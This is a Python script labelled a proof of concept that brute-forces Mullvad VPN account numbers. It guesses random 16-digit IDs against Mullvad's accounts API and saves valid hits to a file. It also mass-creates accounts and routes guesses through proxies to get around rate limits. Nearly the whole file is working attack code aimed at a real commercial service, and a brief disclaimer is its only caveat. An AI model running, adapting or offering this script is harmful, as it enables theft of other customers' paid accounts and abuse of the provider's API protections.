#!/usr/bin/env python3

# Mullvad VPN account brute force, proof of concept
# Do not use this script for unlawful or irresponsible purpose

import requests
import json
import random
from os import system, name
import time
from colorama import init, Fore, Style
#from plyer import notification
init()

def cls():
    if name == 'nt':
        system('cls')
    else: system('clear')

headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Content-Type": "application/json",
}

# function for Windows notifications
def notify_win(msg):
    if name == 'nt':    # only make notifications if running Windows
        try:
            notification.notify(
                title = 'Nullvad',
                message = msg,
                app_icon = None,
                timeout = 10,
            )
        except:
            print('Error sending notification')
    else:
        pass

# make a random number
def Random(n):
    start = 10**(n-1)
    end = (10**n)-1
    return random.randint(start, end)

def create_account():
    data = {}
    resp = requests.post('https://api.mullvad.net/www/accounts/', headers=headers, json=data)
    genj = json.loads(resp.text)
    print('ID: ' + genj['account']['pretty_token'])

def guess():
    n = 10
    randnum = Random(16)
    resps = requests.get('https://api.mullvad.net/www/accounts/' + str(randnum), headers=headers, proxies=proxies)
    if 'auth_token' in resps.text:
        print('SUCCESSFUL ID: ' + str(randnum))
        with open('goodaccounts.txt','a') as file1:
            file1.write(str(randnum) + '\n')
        print('Account number saved to goodaccounts.txt')
    elif resps.status_code == 503:
        print(Fore.RED + 'Warning Rate limit broken! Pausing for 60 seconds' + Style.RESET_ALL)
        time.sleep(60)
    else:
        print(Fore.RED + 'Invalid credential: ' + Style.RESET_ALL + str(randnum))
        with open('bad.txt', 'a') as file2:
            file2.write(str(randnum) + '\n')

# rate limit to follow, in seconds
COOLDOWN = 301

cls()
print(Fore.CYAN + '''
 ███▄    █  █    ██  ██▓     ██▓  ██▒   █▓ ▄▄▄      ▓█████▄ 
 ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒ ▓██░   █▒▒████▄    ▒██▀ ██▌
▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░  ▓██  █▒░▒██  ▀█▄  ░██   █▌
▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░   ▒██ █░░░██▄▄▄▄██ ░▓█▄   ▌
▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒▀█░   ▓█   ▓██▒░▒████▓ 
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░░ ▐░   ▒▒   ▓▒█░ ▒▒▓  ▒ 
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░░ ░░    ▒   ▒▒ ░ ░ ▒  ▒ 
   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░     ░░    ░   ▒    ░ ░  ░ 
         ░    ░         ░  ░    ░  ░ by Mike E     ░  ░   ░    
                                      ░              ░      
''')
print(Style.RESET_ALL)

#proxyinput = input('Enter full proxy URL including scheme i.e. socks5://myproxy:1234' + '\n')
#proxies = {'https': proxyinput}

while True:
    print('Choose an option:')
    print('[1] Create new account')
    print('[2] Account brute force')
    print('[3] Account brute force with Proxy')
    choice = input('> ')

    # create new account
    if choice == '1':
        print()
        print('How many accounts do you want to create?')
        numgen = input('> ')
        print()
        for x in range(int(numgen)):
            create_account()
        print()

    # guesser without proxy
    elif choice == '2':
        print()
        proxies = {}    # so requests doesn't throw an exception about proxies{} not being defined when calling guess()
        print('How many account numbers to guess? Enter 0 to run indefinitely.')
        num_of_guesses = input('> ')
        print()
        if int(num_of_guesses) == 0:
            while True:
                guess()
                time.sleep(COOLDOWN)
        if int(num_of_guesses) > 0:
            for i in range(int(num_of_guesses)):
                guess()
                if int(num_of_guesses) > 1: # only wait for cooldown if making more than 1 guess
                    time.sleep(COOLDOWN)
        print()

    # guesser with proxy
    elif choice == '3':
        print()
        print('Enter full proxy URL including scheme+port i.e. socks5h://myproxy:4145 or https://1.2.3.4:8080')
        proxyinput = input('> ')
        proxies = {'https': proxyinput} # must define key as https because api target is https
        print('How many account numbers to guess? Enter 0 to run indefinitely')
        num_of_guesses = input('> ')
        print()
        if int(num_of_guesses) == 0:    # Run forever
            while True:
                try:
                    guess()
                    time.sleep(COOLDOWN)
                except:
                    print('Error, usually bad proxy')
                    break
        if int(num_of_guesses) > 0:
            for i in range(int(num_of_guesses)):
                try:
                    guess()
                    if int(num_of_guesses) > 1: # only wait for cooldown if making more than 1 guess
                        time.sleep(COOLDOWN)
                except:
                    print('Error, usually bad proxy')
                    break
        print()

    else:
        print()
        print('Invalid option')
        print()
